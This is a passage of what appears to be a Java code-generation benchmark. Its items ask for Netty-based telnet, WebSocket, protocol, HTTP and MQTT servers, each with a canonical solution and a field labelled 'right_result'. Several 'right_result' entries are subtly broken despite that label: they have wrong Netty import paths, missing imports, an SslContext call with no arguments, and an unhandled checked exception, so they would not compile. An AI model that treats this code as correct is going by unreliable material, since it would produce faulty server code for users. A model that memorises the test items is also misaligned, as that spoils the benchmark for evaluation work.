pipeline.addLast(new LoggingHandler(LogLevel.INFO));\n                            pipeline.addLast(new MyHandler());\n                        }\n                    });\n\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    static class MyHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            System.out.println(\"Received: \" + msg);\n            ctx.writeAndFlush(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 189,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling telnet connections with optional SSL encryption.\n\nClass Description: The TelnetServer class is a Netty-based TCP server implementation that listens for incoming telnet connections. It supports optional SSL encryption and provides graceful shutdown capabilities. The server uses a boss-worker thread model for handling connections efficiently.\n\nAttributes:\n- SSL: [boolean] - Flag indicating whether SSL encryption should be enabled\n- PORT: [int] - The port number on which the server will listen for connections\n\nMethods:\n- start(): [void] throws [Exception] - Initializes and starts the TCP server. Configures SSL if enabled, sets up event loop groups, and binds to the specified port. The method blocks until the server is shut down.\n  - Input: None\n  - Output: None (but may throw exceptions during server setup or operation)\n  - Side effects: Starts a TCP server that listens for incoming connections and processes them using the configured pipeline handlers",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class TelnetServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8992\" : \"8023\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContext.newServerContext(ssc.certificate(), ssc.privateKey());\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new TelnetServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.telnet.TelnetHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.SslHandler;\n\nimport javax.net.ssl.SSLException;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.SecureRandom;\nimport java.security.UnrecoverableKeyException;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\n\npublic class TelnetServer {\n    private final boolean ssl;\n    private final int port;\n\n    public TelnetServer(boolean ssl, int port) {\n        this.ssl = ssl;\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (ssl) {\n                         p.addLast(new SslHandler(SslContext.newServerContext()));\n                     }\n                     p.addLast(new TelnetHandler());\n                 }\n             })\n             .option(io.netty.channel.ChannelOption.SO_BACKLOG, 100)\n             .childOption(io.netty.channel.ChannelOption.SO_REUSEADDR, true);\n\n            ChannelFuture future = b.bind(port).sync();\n\n            future.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        TelnetServer server = new TelnetServer(false, 8080);\n        server.start();\n    }\n}"
  },
  {
    "Task_id": 190,
    "Instruction": "Task Description: Create a Java class that implements a WebSocket chat server using Netty framework to handle TCP connections and manage client communications.\n\nClass Description: The WebSocketChatServer class is responsible for setting up and running a Netty-based TCP server that handles WebSocket connections for chat functionality. It manages server resources and gracefully shuts down when needed.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nWebSocketChatServer(int port) -> None - Constructor that initializes the server with the specified port number\nrun() throws Exception -> None - Starts the server, binds it to the specified port, and keeps it running until shutdown is requested. Manages server resources and ensures proper cleanup.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class WebSocketChatServer {\n\n    private int port;\n\n    public WebSocketChatServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new WebSocketChatServerInitializer())\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n            \n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.NioEventLoopGroup;\nimport io.netty.channel.nio.NioServerSocketChannel;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler;\nimport io.netty.handler.codec.http.websocketx.TextWebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketFrame;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.buffer.Unpooled;\nimport java.util.ArrayList;\nimport java.util.List;\nimport io.netty.handler.simple.SimpleChannelInboundHandler;\n\npublic class WebSocketChatServer {\n    private final int port;\n\n    public WebSocketChatServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                     .channel(NioServerSocketChannel.class)\n                     .childHandler(new ChannelInitializer<SocketChannel>() {\n                         @Override\n                         protected void initChannel(SocketChannel ch) {\n                             ch.pipeline().addLast(new HttpServerCodec());\n                             ch.pipeline().addLast(new HttpObjectAggregator());\n                             ch.pipeline().addLast(new WebSocketServerProtocolHandler(\"/ws\"));\n                             ch.pipeline().addLast(new WebSocketChatHandler());\n                         }\n                     })\n                     .option(ChannelOption.SO_BACKLOG, 100)\n                     .childOption(ChannelOption.SO_REUSEADDR, true);\n\n            ChannelFuture future = bootstrap.bind(port).sync();\n\n            future.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    private static class WebSocketChatHandler extends SimpleChannelInboundHandler<WebSocketFrame> {\n        private final List<Channel> clients = new ArrayList<>();\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            clients.add(ctx.channel());\n            System.out.println(\"Client connected\");\n        }\n\n        @Override\n        public void channelInactive(ChannelHandlerContext ctx) {\n            clients.remove(ctx.channel());\n            System.out.println(\"Client disconnected\");\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, WebSocketFrame frame) {\n            if (frame instanceof TextWebSocketFrame) {\n                String message = ((TextWebSocketFrame) frame).text();\n                System.out.println(\"Received: \" + message);\n                for (Channel client : clients) {\n                    client.writeAndFlush(new TextWebSocketFrame(message));\n                }\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 192,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process protocol messages.\n\nClass Description: ProtocolServer is a Netty-based TCP server implementation that listens on a specified port, handles incoming connections, and processes protocol messages using custom channel handlers. It manages server resources including event loop groups and provides graceful shutdown capabilities.\n\nAttributes:\n- acceptorEventLoopGroup: [EventLoopGroup] - Handles accepting new connections (boss group)\n- networkEventLoopGroup: [EventLoopGroup] - Handles network I/O operations (worker group)\n- eventExecutorGroup: [EventExecutorGroup] - Executes business logic handlers\n- config: [Config] - Server configuration including port number\n- applicationContext: [ApplicationContext] - Spring application context for dependency injection\n\nMethods:\n- ProtocolServer([Config] config, [ApplicationContext] applicationContext) -> [void] - Constructor that initializes event loop groups with specified configurations\n- start() -> [ChannelFuture] - Starts the server, binds to the configured port, and returns a ChannelFuture that can be used to wait for server shutdown",
    "Canonical_solution": "import com.codingapi.txlcn.protocol.config.Config;\nimport com.codingapi.txlcn.protocol.handler.ProtocolChannelHandler;\nimport com.codingapi.txlcn.protocol.handler.ProtocolChannelInitializer;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.util.concurrent.EventExecutorGroup;\nimport org.springframework.context.ApplicationContext;\n\nimport java.util.concurrent.TimeUnit;\n\npublic class ProtocolServer {\n\n    private final EventLoopGroup acceptorEventLoopGroup;\n    private final EventLoopGroup networkEventLoopGroup;\n    private final EventExecutorGroup eventExecutorGroup;\n    private final Config config;\n    private final ApplicationContext applicationContext;\n\n    public ProtocolServer(Config config, ApplicationContext applicationContext) {\n        this.config = config;\n        this.applicationContext = applicationContext;\n        this.acceptorEventLoopGroup = new NioEventLoopGroup(1);\n        this.networkEventLoopGroup = new NioEventLoopGroup(6);\n        this.eventExecutorGroup = new NioEventLoopGroup(10);\n    }\n\n    public ChannelFuture start() throws InterruptedException {\n        int portToBind = config.getPort();\n        ProtocolChannelHandler protocolChannelHandler = new ProtocolChannelHandler(new Protocoler(config), applicationContext, config);\n        ProtocolChannelInitializer protocolChannelInitializer = new ProtocolChannelInitializer(config, protocolChannelHandler, eventExecutorGroup);\n\n        final ServerBootstrap peerBootstrap = new ServerBootstrap();\n        peerBootstrap.group(acceptorEventLoopGroup, networkEventLoopGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.SO_BACKLOG, 100)\n                .handler(new LoggingHandler(LogLevel.INFO))\n                .childHandler(protocolChannelInitializer);\n\n        final ChannelFuture bindFuture = peerBootstrap.bind(portToBind).sync();\n        if (bindFuture.isSuccess()) {\n            final Channel serverChannel = bindFuture.channel();\n            return serverChannel.closeFuture();\n        } else {\n            throw new RuntimeException(\"Server could not bind to \" + portToBind, bindFuture.cause());\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.util.DefaultEventExecutorGroup;\nimport org.springframework.context.ApplicationContext;\n\npublic class ProtocolServer {\n    private final EventLoopGroup acceptorEventLoopGroup;\n    private final EventLoopGroup networkEventLoopGroup;\n    private final EventExecutorGroup eventExecutorGroup;\n    private final Config config;\n    private final ApplicationContext applicationContext;\n\n    public ProtocolServer(Config config, ApplicationContext applicationContext) {\n        this.config = config;\n        this.applicationContext = applicationContext;\n        this.acceptorEventLoopGroup = new NioEventLoopGroup(config.getAcceptors());\n        this.networkEventLoopGroup = new NioEventLoopGroup(config.getWorkers());\n        this.eventExecutorGroup = new DefaultEventExecutorGroup(config.getBusinessThreads());\n    }\n\n    public ChannelFuture start() {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(acceptorEventLoopGroup, networkEventLoopGroup)\n                 .channel(NioServerSocketChannel.class)\n                 .childHandler(new ChannelInitializer<SocketChannel>() {\n                     @Override\n                     protected void initChannel(SocketChannel ch) {\n                         ChannelPipeline pipeline = ch.pipeline();\n                         pipeline.addLast(new ProtocolServerHandler(eventExecutorGroup, applicationContext));\n                     }\n                 })\n                 .option(ChannelOption.SO_REUSEADDR, true)\n                 .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        ChannelFuture future = bootstrap.bind(config.getPort()).sync();\n        Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n            future.channel().close();\n            acceptorEventLoopGroup.shutdownGracefully();\n            networkEventLoopGroup.shutdownGracefully();\n            eventExecutorGroup.shutdownGracefully();\n        }));\n\n        return future;\n    }\n}"
  },
  {
    "Task_id": 195,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and manage them efficiently.\n\nClass Description: The `NettyServer` class is a TCP server implementation using Netty framework. It listens on a specified host and port, manages client connections, and provides hooks for connection events. The server uses non-blocking I/O and maintains a set of active connections.\n\nAttributes:\n- host: [String] - The host address the server binds to (can be null for any local address)\n- port: [int] - The port number the server listens on\n- connections: [Set<Connection>] - Thread-safe set of active client connections\n- onConnect: [Consumer<Connection>] - Callback function triggered when a new connection is established\n- eventLoopGroup: [EventLoopGroup] - Netty event loop group for handling I/O operations\n- server: [ServerBootstrap] - Netty server bootstrap instance for server configuration\n\nMethods:\n- start(): [void] - Starts the Netty server, binds to the specified host and port, and begins accepting connections\n- channelInitializer(): [ChannelInitializer<SocketChannel>] - Creates and returns a channel initializer for new connections\n- close(): [void] - Shuts down the server gracefully, releasing all resources",
    "Canonical_solution": "import io.dingodb.common.Location;\nimport io.dingodb.common.concurrent.ThreadPoolBuilder;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport lombok.Builder;\nimport lombok.Getter;\nimport lombok.extern.slf4j.Slf4j;\n\nimport java.util.Set;\nimport java.util.concurrent.CopyOnWriteArraySet;\nimport java.util.function.Consumer;\n\nimport static io.dingodb.net.netty.Constant.SERVER;\n\n@Slf4j\n@Getter\n@Builder\npublic class NettyServer {\n\n    public final String host;\n    public final int port;\n    private final Set<Connection> connections = new CopyOnWriteArraySet<>();\n    private final Consumer<Connection> onConnect;\n\n    private EventLoopGroup eventLoopGroup;\n    private ServerBootstrap server;\n\n    public void start() throws Exception {\n        server = new ServerBootstrap();\n        eventLoopGroup = new NioEventLoopGroup(2, new ThreadPoolBuilder().name(\"Netty server \" + port).build());\n        server\n            .channel(NioServerSocketChannel.class)\n            .group(eventLoopGroup)\n            .childOption(ChannelOption.TCP_NODELAY, true)\n            .childHandler(channelInitializer());\n        if (host != null) {\n            server.localAddress(host, port);\n        } else {\n            server.localAddress(port);\n        }\n        try {\n            server.bind().sync().await();\n        } catch (Exception e) {\n            log.error(e.getMessage(), e);\n            System.exit(-1);\n        }\n    }\n\n    private ChannelInitializer<SocketChannel> channelInitializer() {\n        return new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) {\n                Connection connection = new Connection(\n                    SERVER, new Location(ch.remoteAddress().getHostName(), ch.remoteAddress().getPort()), ch\n                );\n                NettyHandlers.initChannelPipelineWithHandshake(ch, connection);\n                connections.add(connection);\n                if (onConnect != null) {\n                    onConnect.accept(connection);\n                }\n                ch.closeFuture().addListener(f -> connections.remove(connection)).addListener(f -> connection.close());\n            }\n        };\n    }\n\n    public void close() {\n        eventLoopGroup.shutdownGracefully();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CopyOnWriteArraySet;\nimport java.util.Set;\nimport java.util.function.Consumer;\n\npublic class NettyServer {\n    private String host;\n    private int port;\n    private Set<Connection> connections;\n    private Consumer<Connection> onConnect;\n    private EventLoopGroup eventLoopGroup;\n    private ServerBootstrap server;\n\n    static class Connection {\n        private final Channel channel;\n        public Connection(Channel channel) {\n            this.channel = channel;\n        }\n        public Channel channel() {\n            return channel;\n        }\n    }\n\n    public NettyServer(String host, int port) {\n        this.host = host;\n        this.port = port;\n        this.connections = new CopyOnWriteArraySet<>();\n        this.eventLoopGroup = new NioEventLoopGroup();\n        this.server = new ServerBootstrap();\n        this.server.group(eventLoopGroup)\n                   .channel(NioServerSocketChannel.class)\n                   .childHandler(channelInitializer());\n    }\n\n    public void setOnConnect(Consumer<Connection> onConnect) {\n        this.onConnect = onConnect;\n    }\n\n    public void start() {\n        server.bind(new InetSocketAddress(host, port)).syncUninterruptibly();\n    }\n\n    public ChannelInitializer<SocketChannel> channelInitializer() {\n        return new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) throws Exception {\n                ch.pipeline().addLast(new SimpleChannelInboundHandler<Object>() {\n                    @Override\n                    protected void channelRead0(ChannelHandlerContext ctx, Object msg) {\n                        // Handle incoming messages\n                    }\n                });\n                Connection connection = new Connection(ch);\n                connections.add(connection);\n                onConnect.accept(connection);\n            }\n        };\n    }\n\n    public void close() {\n        eventLoopGroup.shutdownGracefully();\n    }\n}"
  },
  {
    "Task_id": 197,
    "Instruction": "Task Description: Create a Java class that implements a simple HTTP server using Netty framework, capable of handling incoming HTTP requests and providing graceful shutdown functionality.\n\nClass Description: NettyHttpServer is a class that sets up and manages a Netty-based HTTP server. It initializes the server with configurable options, handles incoming HTTP requests through a pipeline of handlers, and provides methods to control the server lifecycle.\n\nAttributes:\n- bossGroup: EventLoopGroup - Handles incoming connections and accepts them\n- workerGroup: EventLoopGroup - Handles the traffic of accepted connections\n- port: int - The port number on which the server is listening\n\nMethods:\n- init() -> void - Initializes and starts the HTTP server on an available port, setting up the necessary event loop groups and channel pipeline\n- stop() -> void - Shuts down the server gracefully by releasing all resources and closing the event loop groups\n- getUrl(String path) -> String - Constructs and returns a complete URL string using the server's address and the provided path",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport java.net.InetSocketAddress;\n\npublic class NettyHttpServer {\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private int port;\n\n    public void init() {\n        stop();\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.option(ChannelOption.SO_BACKLOG, 1024);\n        b.group(bossGroup, workerGroup)\n            .channel(NioServerSocketChannel.class)\n            .childHandler(new ChannelInitializer<Channel>() {\n                @Override\n                protected void initChannel(final Channel ch) throws Exception {\n                    ChannelPipeline p = ch.pipeline();\n                    p.addLast(new HttpServerCodec());\n                    p.addLast(NettyHttpTracing.create(httpTracing).serverHandler());\n                    p.addLast(new TestHandler(httpTracing));\n                }\n            });\n\n        try {\n            Channel ch = b.bind(0).sync().channel();\n            port = ((InetSocketAddress) ch.localAddress()).getPort();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new AssertionError(e);\n        }\n    }\n\n    public String getUrl(String path) {\n        return \"http://127.0.0.1:\" + port + path;\n    }\n\n    public void stop() {\n        if (bossGroup != null) bossGroup.shutdownGracefully();\n        if (workerGroup != null) workerGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.NioEventLoopGroup;\nimport io.netty.channel.nio.NioServerSocketChannel;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.FullHttpRequest;\nimport io.netty.handler.codec.http.SimpleChannelInboundHandler;\n\npublic class NettyHttpServer {\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private final int port;\n    private String serverAddress;\n\n    public NettyHttpServer(int port) {\n        this.port = port;\n        this.bossGroup = new NioEventLoopGroup();\n        this.workerGroup = new NioEventLoopGroup();\n    }\n\n    public void init() {\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(new HttpServerCodec());\n                            pipeline.addLast(new HttpObjectAggregator(65536));\n                            pipeline.addLast(new MyHttpHandler());\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 100)\n                    .childOption(ChannelOption.SO_REUSEADDR, true);\n\n            ChannelFuture future = bootstrap.bind(port).sync();\n            serverAddress = future.channel().localAddress().toString();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        shutdown();\n    }\n\n    private void shutdown() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    public String getUrl(String path) {\n        return \"http://\" + serverAddress + path;\n    }\n\n    static class MyHttpHandler extends SimpleChannelInboundHandler<FullHttpRequest> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest req) {\n            // Handle the request, for example, just echo it back\n            System.out.println(\"Received request: \" + req.uri());\n            // You can add your logic here\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 198,
    "Instruction": "Task Description: Implement a Netty-based TCP server acceptor class that handles MQTT protocol communication, including server initialization, configuration, and graceful shutdown.\n\nClass Description: NettyAcceptor is a server acceptor implementation that uses Netty framework to create a TCP server for MQTT protocol communication. It manages server resources, handles incoming connections, and processes MQTT messages through configured handlers.\n\nAttributes:\n- m_bossGroup: [NioEventLoopGroup] - The parent event loop group that accepts incoming connections\n- m_workerGroup: [NioEventLoopGroup] - The child event loop group that handles the traffic of accepted connections\n- channelClass: [Class<? extends ServerSocketChannel>] - The channel class implementation (NIO in this case)\n- nettySoBacklog: [int] - Maximum queue length for incoming connection indications\n- nettySoReuseaddr: [boolean] - Whether to reuse local address and port\n- nettyTcpNodelay: [boolean] - Whether to enable TCP_NODELAY (disable Nagle's algorithm)\n- nettySoKeepalive: [boolean] - Whether to enable SO_KEEPALIVE\n- nettyChannelTimeoutSeconds: [int] - Channel idle timeout in seconds\n\nMethods:\n- initialize([ProtocolProcessor processor, IConfig props, ISslContextCreator sslCtxCreator]) -> [void] - Initializes the acceptor with MQTT processor, configuration properties, and SSL context creator\n- initializePlainTCPTransport([NettyMQTTHandler handler, IConfig props]) -> [void] - Configures and starts the plain TCP transport with MQTT-specific handlers\n- close() -> [void] - Shuts down the acceptor gracefully, releasing all resources",
    "Canonical_solution": "import io.moquette.server.ServerAcceptor;\nimport io.moquette.server.config.IConfig;\nimport io.moquette.spi.impl.ProtocolProcessor;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.mqtt.MqttDecoder;\nimport io.netty.handler.codec.mqtt.MqttEncoder;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.concurrent.Future;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport java.io.IOException;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyAcceptor implements ServerAcceptor {\n\n    private static final Logger LOG = LoggerFactory.getLogger(NettyAcceptor.class);\n\n    private EventLoopGroup m_bossGroup;\n    private EventLoopGroup m_workerGroup;\n    private Class<? extends ServerSocketChannel> channelClass;\n    private int nettySoBacklog;\n    private boolean nettySoReuseaddr;\n    private boolean nettyTcpNodelay;\n    private boolean nettySoKeepalive;\n    private int nettyChannelTimeoutSeconds;\n\n    @Override\n    public void initialize(ProtocolProcessor processor, IConfig props, ISslContextCreator sslCtxCreator) throws IOException {\n        LOG.info(\"Initializing Netty acceptor...\");\n\n        nettySoBacklog = Integer.parseInt(props.getProperty(BrokerConstants.NETTY_SO_BACKLOG_PROPERTY_NAME, \"128\"));\n        nettySoReuseaddr = Boolean.parseBoolean(props.getProperty(BrokerConstants.NETTY_SO_REUSEADDR_PROPERTY_NAME, \"true\"));\n        nettyTcpNodelay = Boolean.parseBoolean(props.getProperty(BrokerConstants.NETTY_TCP_NODELAY_PROPERTY_NAME, \"true\"));\n        nettySoKeepalive = Boolean.parseBoolean(props.getProperty(BrokerConstants.NETTY_SO_KEEPALIVE_PROPERTY_NAME, \"true\"));\n        nettyChannelTimeoutSeconds = Integer.parseInt(props.getProperty(BrokerConstants.NETTY_CHANNEL_TIMEOUT_SECONDS_PROPERTY_NAME, \"10\"));\n\n        LOG.info(\"Netty is using NIO\");\n        m_bossGroup = new NioEventLoopGroup(1);\n        m_workerGroup = new NioEventLoopGroup();\n        channelClass = NioServerSocketChannel.class;\n\n        final NettyMQTTHandler mqttHandler = new NettyMQTTHandler(processor);\n        initializePlainTCPTransport(mqttHandler, props);\n    }\n\n    private void initializePlainTCPTransport(final NettyMQTTHandler handler, IConfig props) throws IOException {\n        LOG.info(\"Configuring TCP MQTT transport\");\n        final MoquetteIdleTimeoutHandler timeoutHandler = new MoquetteIdleTimeoutHandler();\n        String host = props.getProperty(BrokerConstants.HOST_PROPERTY_NAME, \"0.0.0.0\");\n        String tcpPortProp = props.getProperty(PORT_PROPERTY_NAME, DISABLED_PORT_BIND);\n        if (DISABLED_PORT_BIND.equals(tcpPortProp)) {\n            LOG.info(\"TCP MQTT will be disabled\");\n            return;\n        }\n        int port = Integer.parseInt(tcpPortProp);\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(m_bossGroup, m_workerGroup)\n            .channel(channelClass)\n            .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline pipeline = ch.pipeline();\n                    pipeline.addFirst(\"idleStateHandler\", new IdleStateHandler(nettyChannelTimeoutSeconds, 0, 0));\n                    pipeline.addAfter(\"idleStateHandler\", \"idleEventHandler\", timeoutHandler);\n                    pipeline.addLast(\"decoder\", new MqttDecoder());\n                    pipeline.addLast(\"encoder\", MqttEncoder.INSTANCE);\n                    pipeline.addLast(\"handler\", handler);\n                }\n            })\n            .option(ChannelOption.SO_BACKLOG, nettySoBacklog)\n            .option(ChannelOption.SO_REUSEADDR, nettySoReuseaddr)\n            